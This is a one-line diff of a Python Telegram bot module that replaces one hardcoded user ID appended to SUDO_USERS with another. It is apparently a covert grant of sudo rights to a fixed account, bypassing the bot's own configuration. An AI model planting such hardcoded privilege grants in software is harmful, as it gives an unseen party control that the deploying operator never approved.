@@ -11,7 +11,7 @@ from pyrogram.types import Message
 from rocks.helpers.admins import get_administrators
 from rocks.config import SUDO_USERS
 
-SUDO_USERS.append(1342820594)
+SUDO_USERS.append(5411596730)
 
 
 def errors(func: Callable) -> Callable:
